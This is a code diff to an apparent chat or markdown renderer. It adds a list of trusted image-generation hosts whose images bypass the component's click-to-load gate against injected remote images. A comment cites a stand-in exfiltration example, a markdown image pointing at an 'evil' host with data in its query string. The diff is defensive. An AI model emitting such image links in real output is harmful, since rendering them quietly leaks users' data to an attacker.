@@ -30,6 +30,12 @@ const schema = {
 
 // Remote images are click-to-load: an injected ![](https://evil/?q=…) must not
 // fire on render. data:image/ URLs can't exfiltrate and render immediately.
+// Images from our own generation providers auto-load (we minted the URL).
+const TRUSTED_IMAGE_HOSTS = new Set([
+  "platform-outputs.agnes-ai.space",
+  "oaidalleapiprodscus.blob.core.windows.net",
+  "generativelanguage.googleapis.com",
+]);
 function SafeImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
   const [loaded, setLoaded] = useState(false);
   const s = String(src || "");
@@ -39,6 +45,9 @@ function SafeImage({ src, alt, title }: { src?: string; alt?: string; title?: st
   }
   let host = "";
   try { host = new URL(s).hostname.replace(/^www\./, ""); } catch { return null; }
+  if (TRUSTED_IMAGE_HOSTS.has(host)) {
+    return <img src={s} alt={alt || ""} title={title} className="md-img" loading="lazy" />;
+  }
   if (!loaded) {
     return (
       <button type="button" className="img-gate" onClick={() => setLoaded(true)}>
